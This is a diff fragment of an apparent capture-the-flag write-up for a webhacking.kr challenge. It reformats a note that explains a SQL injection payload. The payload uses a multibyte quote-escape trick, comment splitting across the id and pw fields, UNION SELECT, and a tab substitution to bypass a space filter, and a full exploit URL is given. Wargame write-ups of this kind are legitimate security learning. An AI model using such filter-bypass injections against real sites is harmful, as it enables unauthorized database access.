@@ -88,7 +88,9 @@ id: %A1'/*                                               #'
 pw: */UNION%09SELECT%093%23                              #
 ```
 
-> **Note**: `%09` is tab, used to bypass space filter. `%23` is `#` to comment anything after injection. Raw `#` will not work in URL!
+::: info Note
+`%09` is tab, used to bypass space filter. `%23` is `#` to comment anything after injection. Raw `#` will not work in URL!
+:::
 
 [https://webhacking.kr/challenge/web-25/?id=%A2%27/*&pw=*/UNION%09SELECT%093%23](https://webhacking.kr/challenge/web-25/?id=%A2%27/*&pw=*/UNION%09SELECT%093%23)
 
